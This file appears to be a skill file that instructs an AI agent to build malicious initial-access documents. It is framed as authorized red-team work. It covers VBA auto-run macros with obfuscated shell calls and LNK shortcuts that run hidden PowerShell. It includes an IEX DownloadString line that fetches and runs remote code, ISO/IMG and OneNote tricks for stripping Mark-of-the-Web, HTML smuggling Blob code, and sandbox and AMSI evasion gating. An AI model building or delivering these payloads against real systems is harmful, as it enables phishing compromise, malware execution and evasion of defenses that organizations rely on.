---
name: maldoc-initial-access
description: Use when engineering initial-access documents for authorized red-team delivery — Office VBA macro construction and signing, LNK shortcut generation, ISO/IMG container nesting, OneNote embeds, RTF/OLE exploitation vs packaging, HTML smuggling with JS blob construction, and Mark-of-the-Web propagation semantics across container types. Covers sandbox/AV evasion heuristics, emulator breakpoint awareness, detonation telemetry expectations, and payload staging handoff.
license: MIT
---
# Maldoc initial access

Use this skill when building document-based delivery for an authorized engagement: choosing the container format, constructing the lure, embedding the stage-1 payload, and predicting how the file behaves under email gateways, sandbox detonation, and endpoint policy. Route payload/stage-2 engineering to `c2-implant-engineering`, delivery-chain planning and C2 infrastructure to `attack-chain`, and macro exploit CVEs (not construction) to `offensive-exploit-development`.

## When to use

- Engagement needs a document lure that executes stage-1 on open/preview.
- You must reason about MOTW: which container types propagate the Zone.Identifier and which strip it (ISO/IMG/OneNote differences decide the bypass).
- Gateway/sandbox evasion shapes the build: emulator-visible artifacts must be minimized or gated.
- You need a reproducible build pipeline (generator script) rather than one-off handcrafted files.

## Core workflow

### 1. Pick the container by target reality, not preference

| Vector | Executes via | MOTW propagation | Notes |
| --- | --- | --- | --- |
| .docm/.xlsm (VBA) | macro on open | inherits | "Enable content" gate; template-injection pulls remote dotm |
| .doc/.docx + LNK inside ISO/IMG | user double-clicks LNK | **MOTW lost** | defeats SmartScreen + Office macro policy entirely |
| .one (OneNote) | embedded file on double-click | inherits | survives many macro blocks; large file abuse |
| .rtf | exploit in OLE stream | inherits | exploit-based, version-pinned |
| .html | JS blob download | n/a (web) | HTML smuggling; gateway sees inert HTML |
| .lnk direct | powershell/wscript args | inherits | icon abuse from `SHELL32.dll` indices |

Decision order: what does the target open by default → what policy gates exist (macro policy, MOTW enforcement, OneNote availability) → what telemetry the detonation stack produces. Modern default: ISO/IMG-wrapped LNK or OneNote over plain macro documents because Office macro blocking (Mark-of-the-Web) has made direct macro docs unreliable.

### 2. VBA macro construction

- Auto-run trigrams: `AutoOpen` (Word), `Workbook_Open` (Excel), `Document_Open` — plus `Auto_Close` for delayed actions. `Auto_Open`/`AutoOpen` differ by host; define both.
- Shell execution chain: `CreateObject("WScript.Shell").Run` / `Shell "cmd ...", vbHide`; obfuscate strings with `ChrW()` concatenation or xor-decode at runtime — but every obfuscation layer is also an emulator signature; prefer minimal, believable lure text over heavy packing.
- Template injection: `.docx` with `word/_rels/document.xml.rels` pointing `Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"` at a remote `.dotm` hosting the macro — the docx itself stays clean.
- Project signing (`vbaProject.bin` signature) mutes some "unsigned macro" warnings; a self-generated cert chains only in trust you control — record it as a lab-only technique, do not expect enterprise trust.
- Build programmatically: generate with python-docx/oletools-adjacent tooling or modify a saved template — never hand-edit the OLE container by hand; validate output with `olevba` from oletools every time.

### 3. LNK generation

- LNK is the reliable executor inside containers: `powershell.exe -w hidden -ep bypass -c <dlcrun>` or `wscript.exe container.js`; arguments live in `StringData` — build with a generator (e.g. pylnk/LNK construction script), set `IconLocation` to `%SystemRoot%\System32\SHELL32.dll,<idx>` matching the lure (PDF icon index 70-ish, folder, etc.) and a benign `NameString`.
- Keep argument length under ~260 visible chars where the preview truncates; stage longer logic by downloading (`IEX(New-Object Net.WebClient).DownloadString('http://...')` — classic but loudly signatured; prefer staged D/Invoke or a one-byte-modified variant per engagement).

### 4. ISO/IMG/OneNote containers

- ISO (and IMG/VHD) kills MOTW: the mounted volume's files never receive `Zone.Identifier`, so SmartScreen and macro-blocking that key on MOTW never fire. Build ISO with `oscdimg`, `genisoimage`, or `mkisofs`; keep total size under email gateway caps or deliver via link.
- OneNote: insert embedded file (the LNK/payload) + a "double-click to view" image prompt; the embedded-file body lives in `onetoc2`-adjacent binary — build by scripting OneNote or editing a template notebook; test the exact OneNote version — Microsoft has been stripping this path and behavior is build-pinned.
- Nesting order that survives default policy: `email → ISO → LNK → stager`. Verify each hop on a clean VM of the target's build before delivery.

### 5. HTML smuggling

- JS constructs the payload client-side: `const blob = new Blob([atob('<b64>')], {type:'application/octet-stream'})`, `URL.createObjectURL(blob)`, auto-`<a download>` click. The gateway/base64 inspection sees a `.html` with a string; only the browser materializes the EXE/ISO.
- Serve with plausible mime + filename; size limits apply; SMUGGLING only delivers — execution still needs the user run + any MOTW from browser download (browsers DO write Zone.Identifier on save — the ISO-wrapped content still strips it inside).

### 6. MOTW mechanics (the load-bearing detail)

`Zone.Identifier` ADS (`ZoneId=3` for internet) is written by: browsers on save, email clients on extract, and inherited by extracted children. It is NOT written for: files read out of a mounted ISO/IMG/VHD, files inside OneNote embeds extracted by older builds, and some archive-tool extractions. Every "why did this bypass work" question reduces to: who wrote the Zone.Identifier and who read it. Verify per hop: `Get-Item -Stream Zone.Identifier` or `notepad file:Zone.Identifier`.

### 7. Evasion heuristics and detonation awareness

- Emulators stop at: recent-process sleeps (`Start-Sleep` heuristics), large memory allocations, user-interaction prompts, count of loop iterations. Gate execution behind `Environ("COMPUTERNAME")`/uptime/`Application.UserInitials` checks that read naturally, not `If IsSandbvzh()`.
- Macro visibility: `Get-WinEvent Microsoft-Office/Alerts` on a check host shows what AMSI surfaced from VBA — assume AMSI scans `WScript.Shell` strings and design stage-1 as a downloader whose strings are inert.
- Expect detonation: any delivery you send WILL be opened in a sandbox. Make stage-1 environment-gated, single-use URLs, and assume the URL/domain is burned after first detonation.

## Key structures & interfaces

- OLE CFB container (`\Word\VBA_Project`, `\vbaProject.bin` streams) — inspect with `olevba`, `oleid`, `oleobj` (oletools).
- OOXML rels (`word/_rels/*.rels`) — template injection target.
- LNK `ShellLinkHeader` + `StringData`/`ExtraData` blocks — icon path, args, working dir.
- `Zone.Identifier` ADS — `ZoneId=3` internet marker; the policy key everything hangs on.
- HTML5 Blob/`URL.createObjectURL` — smuggling primitives.

## Tooling

oletools (`olevba`, `oleid`, `msodde`), `oscdimg`/`genisoimage`/`mkisofs`, pylnk-class generators, python-docx, OneNote template editor, `Get-Item -Stream` / `streams.exe`, a clean target-build VM with Sysmon + `Microsoft-Office/Alerts` log for self-detonation before delivery.

## Pitfalls & OPSEC

- **Never deliver unvalidated builds**: detonate on a VM matching the target build (Office version, OneNote version, macro policy) and capture what telemetry fired (`Sysmon` Event 1 with hash, Office AMSI alerts) before it goes out.
- Container abuse is build-pinned: OneNote embed behavior and ISO auto-mount change with Windows builds — re-verify per engagement, record build IDs.
- LNK arguments are fully visible to EDR process telemetry — the LNK is the loudest hop; keep it a pure downloader.
- Assume domains/URLs embedded in any document are burned on first detonation; stage via one-time links.
- The signature line is real: every technique here is detection-driven; measure (Sysmon + gateway logs) what each variant produced in your own detonation and pick the quietest, do not assume.

## Routing

- Stage-2 payload, sleep obfuscation, in-memory execution: `c2-implant-engineering`.
- Full delivery chain / infrastructure / phish pretexts: `attack-chain`.
- Document format exploit CVEs (RTF/Equation, etc.): `offensive-exploit-development`.
- Runtime analysis of the sample you built: `malware-analysis` tooling applies to your own artifacts.
- Macro AV/AMSI evasion internals: `edr-bypass-re`.
